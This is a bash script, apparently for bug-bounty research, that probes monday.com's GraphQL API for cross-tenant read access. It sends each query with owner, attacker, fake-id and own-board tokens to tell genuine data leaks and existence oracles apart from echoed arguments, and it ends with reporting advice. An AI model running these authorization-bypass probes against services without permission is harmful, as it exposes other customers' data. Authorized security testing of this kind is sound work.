#!/usr/bin/env bash
# discriminate.sh - settle the three ambiguous results from run-bc.sh.
#
#   export TOKEN_B='<uid 115702202 / actid 36786355>'
#   export TOKEN_C='<uid 115703279 / actid 36786534>'
#   bash discriminate.sh
#
# run-bc.sh flagged dependency_column_config and export_graph because C's board
# id came back in the response. But the id was the argument - the resolvers may
# simply be echoing it with no lookup at all. webhooks returned a 500 rather
# than a denial, which is also not the same thing as a leak.
#
# The discriminator: send each query four ways.
#
#   owner   TOKEN_C + C's board          ground truth, what the data really is
#   attack  TOKEN_B + C's board          the cross-tenant attempt
#   fake    TOKEN_B + an impossible id   pure echo control
#   own     TOKEN_B + B's own board      confirms the field works at all
#
# attack == fake  -> the resolver echoes its argument. Nothing here.
# attack != fake  -> B distinguishes a real foreign board from a fake one.
#                    That is an existence oracle. Low severity, but real.
#
# Read-only throughout. No mutation is sent.

set -uo pipefail
: "${TOKEN_B:?export TOKEN_B first}"
: "${TOKEN_C:?export TOKEN_C first}"

C_BOARD=5103704617
FAKE_BOARD=99999999999999    # 14 digits - past the allocation range, cannot exist
API=https://api.monday.com/v2
DELAY="${DELAY:-1}"

R=$'\033[31m'; G=$'\033[32m'; Y=$'\033[33m'; BD=$'\033[1m'; D=$'\033[2m'; N=$'\033[0m'

run() {
  BODY=$(curl -s "$API" -H "Authorization: $1" -H 'Content-Type: application/json' \
           --max-time 25 -d "{\"query\":\"$2\"}" 2>/dev/null)
  sleep "$DELAY"
}

# strip the volatile request id and every board id, so two bodies that differ
# only by which board was asked for compare equal
norm() {
  sed -e 's/"request_id":"[^"]*"/"request_id":"X"/g' \
      -e 's/"locations":\[[^]]*\]//g' \
      -e "s/$C_BOARD/BID/g" -e "s/$FAKE_BOARD/BID/g" -e "s/$B_BOARD/BID/g"
}

echo
echo "${BD}=== discriminating the three ambiguous results ===${N}"
echo

# B needs one of its own boards for the 'own' arm
run "$TOKEN_B" '{ boards(limit: 1) { id name } }'
B_BOARD=$(printf '%s' "$BODY" | grep -o '"id":"[0-9]\{6,\}"' | head -1 | grep -o '[0-9]\{6,\}')
if [ -z "${B_BOARD:-}" ]; then
  echo "${Y}  B has no board of its own. Create one in account B, then re-run -"
  echo "  without it the 'own' arm cannot tell a broken field from a blocked one.${N}"
  B_BOARD=0
fi
echo "${D}  C's board  $C_BOARD   B's board  $B_BOARD   fake  $FAKE_BOARD${N}"
echo

# probe <label> <query-template with %s for the board id>
probe() {
  local label="$1" tmpl="$2" q
  echo "${BD}--- $label${N}"

  q=$(printf "$tmpl" "$C_BOARD");    run "$TOKEN_C" "$q"; local owner="$BODY"
  q=$(printf "$tmpl" "$C_BOARD");    run "$TOKEN_B" "$q"; local attack="$BODY"
  q=$(printf "$tmpl" "$FAKE_BOARD"); run "$TOKEN_B" "$q"; local fake="$BODY"
  q=$(printf "$tmpl" "$B_BOARD");    run "$TOKEN_B" "$q"; local own="$BODY"

  printf '  %-7s %s\n' "owner"  "$(printf '%s' "$owner"  | head -c 150)"
  printf '  %-7s %s\n' "attack" "$(printf '%s' "$attack" | head -c 150)"
  printf '  %-7s %s\n' "fake"   "$(printf '%s' "$fake"   | head -c 150)"
  printf '  %-7s %s\n' "own"    "$(printf '%s' "$own"    | head -c 150)"

  local a f o
  a=$(printf '%s' "$attack" | norm)
  f=$(printf '%s' "$fake"   | norm)
  o=$(printf '%s' "$owner"  | norm)

  echo
  if [ "$a" = "$f" ]; then
    echo "  ${G}NOTHING HERE${N}  attack == fake. The resolver echoes the argument"
    echo "                without looking the board up. Not reportable."
  elif [ "$a" = "$o" ]; then
    echo "  ${R}${BD}LEAK${N}  attack == owner. B receives exactly what C's own token"
    echo "        receives. This is cross-tenant read. Capture both request ids."
  else
    echo "  ${Y}${BD}ORACLE${N}  attack differs from fake. B can tell that board $C_BOARD"
    echo "          exists in another account. Existence oracle - low severity,"
    echo "          worth reporting only if the response carries content too."
    echo "          Diff:"
    diff <(printf '%s\n' "$f") <(printf '%s\n' "$a") | head -6 | sed 's/^/          /'
  fi
  echo
}

probe "dependency_column_config" \
  '{ dependency_column_config(board_id: \\"%s\\", account_id: \\"36786534\\", user_id: \\"115703279\\") { board_id dependency_columns { id account_id board_id data } } }'

probe "export_graph" \
  '{ export_graph(boardId: \\"%s\\") { boardId nodeCount edgeCount } }'

probe "webhooks - the 500" \
  '{ webhooks(board_id: \\"%s\\") { id event config } }'

echo "${BD}--- what to do with this ---${N}"
cat <<'MSG'
  NOTHING HERE   drop it. Do not report an argument being echoed back.
  ORACLE         note it, keep hunting. On its own this is usually informational
                 and will likely close as such. It becomes worth writing up if
                 you can chain it - e.g. it confirms ids you then use elsewhere.
  LEAK           this is the real thing. Save both request_ids from the
                 extensions block, screenshot both tokens' /me output, write it up.

  export_graph and dependency_column_config both returned zero-length data for a
  board that has 3 items. Run the owner arm and check: if C's own token also sees
  zeros, the board genuinely has no dependency graph and these fields prove
  nothing either way. To make the test meaningful, add a dependency column to C's
  board and link two items, then re-run.
MSG
